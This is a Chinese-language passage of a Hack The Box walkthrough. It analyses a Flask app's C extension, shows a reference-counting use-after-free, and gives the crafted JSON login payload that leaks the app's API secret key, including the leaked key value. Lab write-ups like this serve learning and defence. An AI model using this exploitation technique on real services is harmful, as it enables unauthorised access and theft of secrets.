<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb6.jpg"></p>
<p>点击try login登录</p>
<ul>
<li>查看之前下载的python文件的源码</li>
</ul>
<p>从&#x2F;backup提取的两个文件构成了Python Flask Web应用程序。 主要代码是auth.py。 第二行是import ses，像其他Python模块一样加载.so共享库。</p>
<p>ses库用于在应用程序启动时创建具有登录凭据的对象。 不幸的是，用户名和密码已从以下备用代码中删除：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def safe_init_manager(<span class="built_in">id</span>):</span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">id</span> <span class="keyword">in</span> Managers:</span><br><span class="line">        del Managers[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">            Managers.update(&#123;<span class="built_in">id</span>: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.<span class="built_in">join</span>(login)))&#125;)</span><br><span class="line">    lock.release()</span><br></pre></td></tr></table></figure>

<p>Flask应用程序具有以@app.before_request修饰的before_request函数，因此它将在将每个请求传递给路由处理代码之前与每个请求一起运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@app.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> not session.has_key(<span class="string">&quot;id&quot;</span>):</span><br><span class="line">            k = get_secure_key()</span><br><span class="line">            safe_init_manager(k)</span><br><span class="line">            session[<span class="string">&quot;id&quot;</span>] = k</span><br><span class="line">        <span class="keyword">elif</span> session.has_key(<span class="string">&quot;id&quot;</span>) and not safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            del session[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.has_key(<span class="string">&quot;id&quot;</span>) and safe_have_manager(session[<span class="string">&quot;id&quot;</span>]):</span><br><span class="line">            pass</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> redirect(<span class="string">&quot;/&quot;</span>, 302)</span><br></pre></td></tr></table></figure>
<p>此代码确保为每次访问创建一个会话，或者将其重定向到&#x2F;。<br>该应用程序有五个路径，&#x2F;assets&#x2F;<span class="exturl" data-url="cGF0aDpmaWxlbmFtZQ==">path:filename<i class="fa fa-external-link-alt"></i></span>, &#x2F;, &#x2F;login, &#x2F;auth, &#x2F;api。 最后两个最有趣。</p>
<h4 id="Shell-as-dzonerzy"><a href="#Shell-as-dzonerzy" class="headerlink" title="Shell as dzonerzy"></a>Shell as dzonerzy</h4><ul>
<li>获取API密钥</li>
</ul>
<p>尝试登录该页面时，有一个POST到&#x2F;auth。 看一下这段代码，就会发现以下内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/auth&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def login():</span><br><span class="line">    ret = &#123;<span class="string">&quot;authenticated&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    data = request.get_json(silent=True)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        try:</span><br><span class="line">            tmp_login = dict(data[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        tmp_user_login = None</span><br><span class="line">        try:</span><br><span class="line">            is_logged = manager.check_login(data)</span><br><span class="line">            secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br><span class="line">            try:</span><br><span class="line">                tmp_user_login = &#123;<span class="string">&quot;username&quot;</span>: tmp_login[<span class="string">&quot;username&quot;</span>], <span class="string">&quot;password&quot;</span>: tmp_login[<span class="string">&quot;password&quot;</span>]&#125;</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> tmp_user_login is not None:</span><br><span class="line">                    log_creds(request.remote_addr, tmp_user_login)</span><br><span class="line">                ret[<span class="string">&quot;authenticated&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = &#123;<span class="string">&quot;endpoint&quot;</span>: secret_token_info[0], <span class="string">&quot;key&quot;</span>: secret_token_info[1], <span class="string">&quot;creation_date&quot;</span>: secret_token_info[2]&#125;</span><br><span class="line">        except TypeError as e:</span><br><span class="line">            ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = str(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate missing parameters.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>现在是需要了解依赖于ses.so中的模块的manager对象的地方。 下图是上面is_logged &#x3D; manager.check_login(data)调用的can_login函数在Ida Pro中的样子：</p>
<p><img src="https://0xdf.gitlab.io/img/1570903084609.png"></p>
<p>国外大佬的图分析的很清楚，再次膜拜</p>
<p>关于Python代码的另一条注释-api密钥（存储为manager.secret_key）在此处设置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;<span class="built_in">id</span>: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.<span class="built_in">join</span>(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>craft_secure_token()，它只是获取输入并对其进行hash处理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def craft_secure_token(content):</span><br><span class="line">    h = hmac.new(<span class="string">&quot;HMACSecureKey123!&quot;</span>, base64.b64encode(content).encode(), hashlib.sha256)</span><br><span class="line">    <span class="built_in">return</span> h.hexdigest()</span><br></pre></td></tr></table></figure>
<p>这意味着只要用户名和密码不变，API密钥也不会改变。</p>
<h3 id="方法1：利用引用计数"><a href="#方法1：利用引用计数" class="headerlink" title="方法1：利用引用计数"></a>方法1：利用引用计数</h3><p>这是预期的方法，但是很难发现.</p>
<p>Python对象是在堆上分配的，并且保留引用计数以监视它们是否在使用中，并且当引用计数达到0时，垃圾收集器将释放空间。 在编写Python代码时，将为您进行管理。 但是一旦开始编写C扩展名（编译为.so文件），就必须<span class="exturl" data-url="aHR0cDovL2VkY2pvbmVzLnRyaXBvZC5jb20vcmVmY291bnQuaHRtbA==">manage these references yourself<i class="fa fa-external-link-alt"></i></span>。 有<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy44L2MtYXBpL3JlZmNvdW50aW5nLmh0bWw=">series of C macros<i class="fa fa-external-link-alt"></i></span>将有助于实现这一目标。 可以通过在CPython源代码中查看<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvbWFzdGVyL0luY2x1ZGUvb2JqZWN0Lmg=">object.c<i class="fa fa-external-link-alt"></i></span>来查看Python对象。</p>
<p>首先，我将看到对象结构使得任何对象中的第一个值都是ob_refcnt，即引用计数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _object &#123;</span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    struct _typeobject *ob_type;</span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure>

<p>我还可以看到PyINCREF(op)宏基本上只是对_PyINCREF的调用，该调用基本上只是向该引用计数器值添加一个：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static inline void _Py_INCREF(PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    _Py_INC_REFTOTAL;</span><br><span class="line">    op-&gt;ob_refcnt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_INCREF(op) _Py_INCREF(_PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>类似地，如果查看Py_DECREF，则相同，除了代码运行不仅会减少引用计数器，而且如果该计数器为0，它将在对象上调用_Py_Dealloc：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static inline void _Py_DECREF(const char *filename, int lineno,</span><br><span class="line">                              PyObject *op)</span><br><span class="line">&#123;</span><br><span class="line">    (void)filename; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    (void)lineno; /* may be unused, shut up -Wunused-parameter */</span><br><span class="line">    _Py_DEC_REFTOTAL;</span><br><span class="line">    <span class="keyword">if</span> (--op-&gt;ob_refcnt != 0) &#123;</span><br><span class="line"><span class="comment">#ifdef Py_REF_DEBUG</span></span><br><span class="line">        <span class="keyword">if</span> (op-&gt;ob_refcnt &lt; 0) &#123;</span><br><span class="line">            _Py_NegativeRefcount(filename, lineno, op);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _Py_Dealloc(op);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define Py_DECREF(op) _Py_DECREF(__FILE__, __LINE__, _PyObject_CAST(op))</span></span><br></pre></td></tr></table></figure>

<p>根据文档，_Py_Dealloc没有在此定义，因为它仅在解释器代码中使用。<br>我将在Ghidra中打开该模块，然后看一下反汇编。 当我开始学习具有这些知识的代码时，便开始看到我认为这些宏的实例。 例如，在SessionManager_check_login中，在第44行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">post_has_data = dict_contains(post_data,&amp;data);</span><br><span class="line"><span class="keyword">if</span> ((char)post_has_data != &#x27;\x01&#x27;) &#123;</span><br><span class="line">  *post_data = *post_data + -<span class="number">1</span>;</span><br><span class="line">  if (*post_data == <span class="number">0</span>) &#123;</span><br><span class="line">    (**(code **)(post_data[<span class="number">1</span>] + <span class="number">0</span>x30))(post_data);</span><br><span class="line">  &#125;</span><br><span class="line">  plVar2 = (long *)ErrorMsg(PyExc_TypeError,<span class="string">&quot;Missing data parameter&quot;</span>,parameter,uVar3,in_R8B,in_R9B</span><br><span class="line">                            ,(char)parameter);</span><br><span class="line">  goto LAB_0010250e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它调用dict_contains来查看传递给它的（我的POST）是否是包含键“data”的字典。 如果返回的结果不为true（’\ x01’），则它将递减参考计数器，然后检查它是否现在为0。如果是，则其自身将调用post_data [1] + 0x30。</p>
<p>由于我知道post_data是一个字典对象，因此我可以查看dictobject.c的Python源代码，以了解结构的定义位置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PyTypeObject PyDictIterItem_Type = &#123;</span><br><span class="line">    PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)</span><br><span class="line">    <span class="string">&quot;dictionary-itemiterator&quot;</span>,                  /* tp_name */</span><br><span class="line">    sizeof(dictiterobject),                     /* tp_basicsize */</span><br><span class="line">    0,                                          /* tp_itemsize */</span><br><span class="line">    /* methods */</span><br><span class="line">    (destructor)dictiter_dealloc,               /* tp_dealloc */</span><br><span class="line">    0,                                          /* tp_print */</span><br><span class="line">    0,                                          /* tp_getattr */</span><br><span class="line">    0,                                          /* tp_setattr */</span><br><span class="line">    0,                                          /* tp_compare */</span><br><span class="line">    0,                                          /* tp_repr */</span><br><span class="line">    0,                                          /* tp_as_number */</span><br><span class="line">    0,                                          /* tp_as_sequence */</span><br><span class="line">    0,                                          /* tp_as_mapping */</span><br><span class="line">    0,                                          /* tp_hash */</span><br><span class="line">    0,                                          /* tp_call */</span><br><span class="line">    0,                                          /* tp_str */</span><br><span class="line">    PyObject_GenericGetAttr,                    /* tp_getattro */</span><br><span class="line">    0,                                          /* tp_setattro */</span><br><span class="line">    0,                                          /* tp_as_buffer */</span><br><span class="line">    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,/* tp_flags */</span><br><span class="line">    0,                                          /* tp_doc */</span><br><span class="line">    (traverseproc)dictiter_traverse,            /* tp_traverse */</span><br><span class="line">    0,                                          /* tp_clear */</span><br><span class="line">    0,                                          /* tp_richcompare */</span><br><span class="line">    0,                                          /* tp_weaklistoffset */</span><br><span class="line">    PyObject_SelfIter,                          /* tp_iter */</span><br><span class="line">    (iternextfunc)dictiter_iternextitem,        /* tp_iternext */</span><br><span class="line">    dictiter_methods,                           /* tp_methods */</span><br><span class="line">    0,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>知道PyVarObject_HEAD_INIT扩展为1，类型，大小，并假设每个单词为8字节，则0x30字节为（（析构函数）dictiter_dealloc）。<br>因此，回过头来，发现了Py_DECREF宏的外观。<br>同样，我在代码中看到的地方如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*data_object = *data_object + 1;</span><br></pre></td></tr></table></figure>

<p>这是Py_INCREF宏扩展的。<br>在此基础上，我将回到手头的代码。 错误在于如何跟踪从请求中读取的Python对象数据的引用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = request.get_json(silent=True)</span><br></pre></td></tr></table></figure>
<p>稍后将其传递到manager.check_login中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br></pre></td></tr></table></figure>

<p>结果is_logged包含is_logged[1]中原始提交的json，该错误消息中引用了json：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>如果登录失败，则会显示POSTED JSON来代替前一个％s：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;authenticated&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">	<span class="string">&quot;result&quot;</span>: <span class="string">&quot;Cannot authenticate with data: &#123;u&#x27;username&#x27;: u&#x27;0xdf&#x27;, u&#x27;password&#x27;: u&#x27;password&#x27;&#125; - Try again!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在C中，我可以在变量声明之后的第二行看到创建新列表对象的地方：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return_list_object = (long *)PyList_New(2);</span><br></pre></td></tr></table></figure>
<p>再向下一点，在检查关键数据是否在发布的JSON&#x2F;字典中之后，它将数据对象读入一个对象，我将其命名为dataobject：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data_object = (long *)get_dict_key(post_data,&amp;data);</span><br></pre></td></tr></table></figure>

<p>接下来是一个阻止程序，用于检查用户是否被阻止并进行处理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user_is_blocked = is_blocked(user_login);</span><br><span class="line"><span class="keyword">if</span> ((char)user_is_blocked == &#x27;\x01&#x27;) &#123;</span><br><span class="line">  user_is_blocked = can_login(user_login);</span><br><span class="line">  if ((char)user_is_blocked != &#x27;\<span class="number">0</span>&#x27;) &#123;</span><br><span class="line">    set_unblocked(user_login);</span><br><span class="line">    set_login_count(user_login,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  local_50 = (long *)PyBool_FromLong(<span class="number">0</span>);</span><br><span class="line">  *local_50 = *local_50 + <span class="number">1</span>;</span><br><span class="line">  *(long **)return_list_object[<span class="number">3</span>] = local_50;</span><br><span class="line">  *data_object = *data_object + <span class="number">1</span>;</span><br><span class="line">  *(long **)(return_list_object[<span class="number">3</span>] + <span class="number">8</span>) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我将注意到，将创建一个布尔False（然后将引用计数器增加Py_INCREF），并将其存储在列表对象的第三个单词中。 然后，将data_object传递给Py_INCREF，然后将其设置为8个字节到同一第三个对象中。 因此，列表中的第三个对象必须是列表本身（第一个对象是引用计数）。 在此函数的最后，我看到这是返回的对象：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br><span class="line">LAB_0010250e:</span><br><span class="line">  <span class="keyword">if</span> (local_20 != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> plVar2;</span><br></pre></td></tr></table></figure>

<p>列表对象上的引用计数增加，然后将其设置为plVar2并返回。<br>如果未阻止用户，则可以看到类似的模式。 将检查登录计数，该计数小于10，它将从POSTed JSON和内部存储中加载用户名和密码。 然后，我将在此处显示三种可能的路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  __s2 = (char *)get_internal_usr(user_login);</span><br><span class="line">  success = strcmp(username_string,__s2);</span><br><span class="line">  <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">    __s2 = (char *)get_internal_pwd(user_login);</span><br><span class="line">    success = strcmp(password_string,__s2);</span><br><span class="line">    <span class="keyword">if</span> (success == 0) &#123;</span><br><span class="line">      puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">      return_value = PyBool_FromLong(1);</span><br><span class="line">      *puVar1 = return_value;</span><br><span class="line">      *data_object = *data_object + 1;</span><br><span class="line">      *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">      goto LAB_001024c5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *data_object = *data_object + 1;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  set_blocked(user_login);</span><br><span class="line">  local_48 = (long *)PyBool_FromLong(1);</span><br><span class="line">  *local_48 = *local_48 + 1;</span><br><span class="line">  puVar1 = (undefined8 *)return_list_object[3];</span><br><span class="line">  return_value = PyBool_FromLong(0);</span><br><span class="line">  *puVar1 = return_value;</span><br><span class="line">  *(long **)(return_list_object[3] + 8) = data_object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个是用户名和密码是否匹配。 它在data_object上调用Py_INCREF，将其设置为列表中的8个字节，并将列表中的0个字节设置为True。<br>如果用户名或密码失败，则将其Py_INCREFs data_ojbect设置为列表中的第一项为False，将data_object上的名称为Py_INCREF，然后将data_object置于第二项。<br>第三个路径是登录计数不小于10。它将第一个列表项设置为False，将第二个列表项设置为data_object。<br>缺少了什么？ 它没有增加data_object的引用计数！ 下一个代码（所有路径都经过）是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LAB_001024c5:</span><br><span class="line">  *data_object = *data_object + -1;</span><br><span class="line">  <span class="keyword">if</span> (*data_object == 0) &#123;</span><br><span class="line">    (**(code **)(data_object[1] + 0x30))(data_object);</span><br><span class="line">  &#125;</span><br><span class="line">  *return_list_object = *return_list_object + 1;</span><br><span class="line">  plVar2 = return_list_object;</span><br></pre></td></tr></table></figure>

<p>这是data_object上的Py_DECREF。<br>这是什么意思？ 在此调用结束时，如果它是第11次失败的登录，则具有用户名和密码的data_object将被标记为不再引用，因此将打开以进行垃圾回收，即使当相同的内存将在错误消息中打印出来时， 代码重新回到Python中。<br>事实证明，在调用manager.check_login（data）之后，无论check_login的结果如何，它都会创建一个对象：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_logged = manager.check_login(data)</span><br><span class="line">secret_token_info = [<span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>, manager.secret_key, int(time.time())]</span><br></pre></td></tr></table></figure>

<p>几行后，识别出登录失败并构造了消息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> not is_logged[0]:</span><br><span class="line">    ret[<span class="string">&quot;authenticated&quot;</span>] = False</span><br><span class="line">    ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Cannot authenticate with data: %s - %s&quot;</span> % (is_logged[1], <span class="string">&quot;Too many tentatives, wait 2 minutes!&quot;</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">&quot;Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<ul>
<li><p>我发送10个失败的登录名。用户状态未设置为已阻止。</p>
</li>
<li><p>我发送了第11次登录尝试，但登录数据已修改，因此它包含与secret_token_info相同的结构，并带有两个字符串和一个int的列表，而不是该站点发送的是带有两个键的字典。</p>
</li>
<li><p>manager.check_login（）由于该块而将失败，并减少data_object上的引用计数，从而使垃圾收集器将堆上的该空间标记为已打开。</p>
</li>
<li><p>该程序在堆上为secret_token_info分配空间，secret_token_info是一个具有两个字符串和一个int的Python对象。由于data_object进行垃圾回收之前所在的空间仅为该大小，因此它将使用该空间。</p>
</li>
<li><p>发送错误消息时，由于出现垃圾回收错误，指向data_object的指针现在指向secret_token_info，而是显示该信息。</p>
</li>
</ul>
<p>Proxy通过Burp发送，并设置拦截。提交一个明显不正确的用户名和密码0xdf&#x2F;0xdf：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb7.jpg"></p>
<p>再发送9次。现在，将其更改为数据为具有两个字符串和一个整数的数组。 它们的值是什么无关紧要。 使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;auth&quot;</span>,<span class="string">&quot;data&quot;</span>:[<span class="string">&quot;0xdf&quot;</span>, <span class="string">&quot;string&quot;</span>, 223]&#125;</span><br></pre></td></tr></table></figure>
<p>当我提交时，错误消息中包含泄漏的信息，包括API密钥及其使用方法：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb8.jpg"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;authenticated&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;result&quot;</span>:<span class="string">&quot;Cannot authenticate with data: [&#x27;/api/&lt;api_key&gt;/job&#x27;, &#x27;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x27;, 1577434053] - Too many tentatives, wait 2 minutes!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="方法2：利用用户名-x3D-x3D-密码"><a href="#方法2：利用用户名-x3D-x3D-密码" class="headerlink" title="方法2：利用用户名&#x3D;&#x3D;密码"></a>方法2：利用用户名&#x3D;&#x3D;密码</h3><p>在这里，我查看了检查用户名和密码的代码。 首先，此块加载输入的用户名和密码，然后调用get_internal_usr，并将输入的用户名与结果进行比较：</p>
<p><img src="https://0xdf.gitlab.io/img/1570906220495.png"></p>
<p>如果匹配，则在此处继续，在此调用get_internal_pwd并将用户输入的密码与结果进行比较：</p>
